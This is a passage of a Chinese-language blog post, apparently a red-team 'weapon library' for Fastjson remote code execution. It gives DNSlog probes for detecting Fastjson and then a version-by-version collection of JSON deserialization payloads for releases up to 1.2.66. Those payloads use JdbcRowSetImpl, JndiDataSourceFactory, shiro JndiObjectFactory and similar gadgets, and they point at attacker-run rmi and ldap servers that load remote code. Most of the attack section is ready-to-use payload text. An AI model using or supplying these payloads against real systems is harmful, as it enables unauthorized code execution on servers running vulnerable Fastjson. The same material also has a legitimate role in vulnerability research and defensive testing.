+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDMyMzQ5MTQucG5n?x-oss-process=image/format,png" alt="image-20200703234914580"></p>
+<h1 id="0x06-漏洞检测"><a href="#0x06-漏洞检测" class="headerlink" title="0x06 漏洞检测"></a>0x06 漏洞检测</h1><h2 id="未知目标是否使用-Fastjson-，但站点有原始报错回显"><a href="#未知目标是否使用-Fastjson-，但站点有原始报错回显" class="headerlink" title="未知目标是否使用 Fastjson ，但站点有原始报错回显"></a><strong>未知目标是否使用 Fastjson ，但站点有原始报错回显</strong></h2><p>如果站点有原始报错回显，可以用不闭合花括号的方式进行报错回显，报错中往往会有fastjson的字样</p>
+<p>例如</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDQxNjI2MTcucG5n?x-oss-process=image/format,png" alt="image-20200704162617071"></p>
+<h2 id="无回显，通过DNS回显的方式盲区分-Fastjson-和-Jackson"><a href="#无回显，通过DNS回显的方式盲区分-Fastjson-和-Jackson" class="headerlink" title="无回显，通过DNS回显的方式盲区分 Fastjson 和 Jackson"></a><strong>无回显，通过DNS回显的方式盲区分 Fastjson 和 Jackson</strong></h2><p>我使用以下payload测试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;745shj.dnslog.cn&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDQxNjI4NDQucG5n?x-oss-process=image/format,png" alt="image-20200704162844047"></p>
+<p>最终收到dnslog</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDQxNjI5MjIucG5n?x-oss-process=image/format,png" alt="image-20200704162922529"></p>
+<h2 id="最新版本1-2-67依然可以通过dnslog判断后端是否使用fastjson"><a href="#最新版本1-2-67依然可以通过dnslog判断后端是否使用fastjson" class="headerlink" title="最新版本1.2.67依然可以通过dnslog判断后端是否使用fastjson"></a>最新版本1.2.67依然可以通过dnslog判断后端是否使用fastjson</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>畸形的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDQxNjMxNTAucG5n?x-oss-process=image/format,png" alt=""></p>
+<p>POC:</p>
+<p>要嵌套在里面zeo里面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:0</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x07-多版本payload集合"><a href="#0x07-多版本payload集合" class="headerlink" title="0x07 多版本payload集合"></a>0x07 多版本payload集合</h1><p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-24"><a href="#fastjson-lt-1-2-24" class="headerlink" title="fastjson&lt;=1.2.24"></a>fastjson&lt;=1.2.24</h3><p>exp：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;x.x.x.x:1099&#x2F;jndi&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-41"><a href="#fastjson-lt-1-2-41" class="headerlink" title="fastjson&lt;=1.2.41"></a>fastjson&lt;=1.2.41</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
+<p>exp：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;x.x.x.x:1098&#x2F;jndi&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-42"><a href="#fastjson-lt-1-2-42" class="headerlink" title="fastjson&lt;=1.2.42"></a>fastjson&lt;=1.2.42</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
+<p>exp：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1399&#x2F;Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-43"><a href="#fastjson-lt-1-2-43" class="headerlink" title="fastjson&lt;=1.2.43"></a>fastjson&lt;=1.2.43</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
+<p>exp：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1399&#x2F;Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-45"><a href="#fastjson-lt-1-2-45" class="headerlink" title="fastjson&lt;=1.2.45"></a>fastjson&lt;=1.2.45</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
+<p>exp：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;:&#123;&quot;data_source&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1399&#x2F;Exploit&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-47"><a href="#fastjson-lt-1-2-47" class="headerlink" title="fastjson&lt;=1.2.47"></a>fastjson&lt;=1.2.47</h3><p>exp：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.Class&quot;, </span><br><span class="line">        &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;, </span><br><span class="line">    &quot;b&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, </span><br><span class="line">        &quot;dataSourceName&quot;: &quot;ldap:&#x2F;&#x2F;x.x.x.x:1999&#x2F;Exploit&quot;, </span><br><span class="line">        &quot;autoCommit&quot;: true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-62"><a href="#fastjson-lt-1-2-62" class="headerlink" title="fastjson&lt;=1.2.62"></a>fastjson&lt;=1.2.62</h3><p>exp：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,&quot;AsText&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:1098&#x2F;exploit&quot;&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-66"><a href="#fastjson-lt-1-2-66" class="headerlink" title="fastjson&lt;=1.2.66"></a>fastjson&lt;=1.2.66</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
+<p>exp：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap:&#x2F;&#x2F;192.168.80.1:1389&#x2F;Calc&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap:&#x2F;&#x2F;192.168.80.1:1389&#x2F;Calc&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;,&quot;jndiNames&quot;:&quot;ldap:&#x2F;&#x2F;192.168.80.1:1389&#x2F;Calc&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,&quot;properties&quot;: &#123;&quot;@type&quot;:&quot;java.util.Properties&quot;,&quot;UserTransaction&quot;:&quot;ldap:&#x2F;&#x2F;192.168.80.1:1399&#x2F;Calc&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/categories">分类</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01漏洞介绍"><span class="toc-number">1.</span> <span class="toc-text">0x01漏洞介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02影响范围"><span class="toc-number">2.</span> <span class="toc-text">0x02影响范围</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03漏洞复现"><span class="toc-number">3.</span> <span class="toc-text">0x03漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#下面是流程示意图"><span class="toc-number">3.1.</span> <span class="toc-text">下面是流程示意图</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#在整个远程命令执行流程"><span class="toc-number">3.1.1.</span> <span class="toc-text">在整个远程命令执行流程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04复现流程"><span class="toc-number">4.</span> <span class="toc-text">0x04复现流程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x041-构造恶意方法"><span class="toc-number">4.1.</span> <span class="toc-text">0x041 构造恶意方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x042-开启远程方法调用rmi服务"><span class="toc-number">4.2.</span> <span class="toc-text">0x042 开启远程方法调用rmi服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x043-发送payload"><span class="toc-number">4.3.</span> <span class="toc-text">0x043 发送payload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05简化版攻击工具"><span class="toc-number">5.</span> <span class="toc-text">0x05简化版攻击工具</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-漏洞检测"><span class="toc-number">6.</span> <span class="toc-text">0x06 漏洞检测</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#未知目标是否使用-Fastjson-，但站点有原始报错回显"><span class="toc-number">6.1.</span> <span class="toc-text">未知目标是否使用 Fastjson ，但站点有原始报错回显</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#无回显，通过DNS回显的方式盲区分-Fastjson-和-Jackson"><span class="toc-number">6.2.</span> <span class="toc-text">无回显，通过DNS回显的方式盲区分 Fastjson 和 Jackson</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#最新版本1-2-67依然可以通过dnslog判断后端是否使用fastjson"><span class="toc-number">6.3.</span> <span class="toc-text">最新版本1.2.67依然可以通过dnslog判断后端是否使用fastjson</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-多版本payload集合"><span class="toc-number">7.</span> <span class="toc-text">0x07 多版本payload集合</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-lt-1-2-24"><span class="toc-number">7.0.1.</span> <span class="toc-text">fastjson&lt;&#x3D;1.2.24</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-lt-1-2-41"><span class="toc-number">7.0.2.</span> <span class="toc-text">fastjson&lt;&#x3D;1.2.41</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-lt-1-2-42"><span class="toc-number">7.0.3.</span> <span class="toc-text">fastjson&lt;&#x3D;1.2.42</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-lt-1-2-43"><span class="toc-number">7.0.4.</span> <span class="toc-text">fastjson&lt;&#x3D;1.2.43</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-lt-1-2-45"><span class="toc-number">7.0.5.</span> <span class="toc-text">fastjson&lt;&#x3D;1.2.45</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-lt-1-2-47"><span class="toc-number">7.0.6.</span> <span class="toc-text">fastjson&lt;&#x3D;1.2.47</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-lt-1-2-62"><span class="toc-number">7.0.7.</span> <span class="toc-text">fastjson&lt;&#x3D;1.2.62</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-lt-1-2-66"><span class="toc-number">7.0.8.</span> <span class="toc-text">fastjson&lt;&#x3D;1.2.66</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://godzeo.github.io/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://godzeo.github.io/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp%E5%A4%8D%E7%8E%B0/&text=红队武器库:fastjson小于1.2.68全漏洞RCE利用exp复现" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://godzeo.github.io/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp%E5%A4%8D%E7%8E%B0/&title=红队武器库:fastjson小于1.2.68全漏洞RCE利用exp复现" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godzeo.github.io/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp%E5%A4%8D%E7%8E%B0/&is_video=false&description=红队武器库:fastjson小于1.2.68全漏洞RCE利用exp复现" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=红队武器库:fastjson小于1.2.68全漏洞RCE利用exp复现&body=Check out this article: https://godzeo.github.io/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp%E5%A4%8D%E7%8E%B0/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://godzeo.github.io/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp%E5%A4%8D%E7%8E%B0/&title=红队武器库:fastjson小于1.2.68全漏洞RCE利用exp复现" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://godzeo.github.io/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp%E5%A4%8D%E7%8E%B0/&title=红队武器库:fastjson小于1.2.68全漏洞RCE利用exp复现" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://godzeo.github.io/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp%E5%A4%8D%E7%8E%B0/&title=红队武器库:fastjson小于1.2.68全漏洞RCE利用exp复现" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://godzeo.github.io/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp%E5%A4%8D%E7%8E%B0/&title=红队武器库:fastjson小于1.2.68全漏洞RCE利用exp复现" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://godzeo.github.io/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp%E5%A4%8D%E7%8E%B0/&name=红队武器库:fastjson小于1.2.68全漏洞RCE利用exp复现&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://godzeo.github.io/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp%E5%A4%8D%E7%8E%B0/&t=红队武器库:fastjson小于1.2.68全漏洞RCE利用exp复现" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2020
+    Zeo
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/categories">分类</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
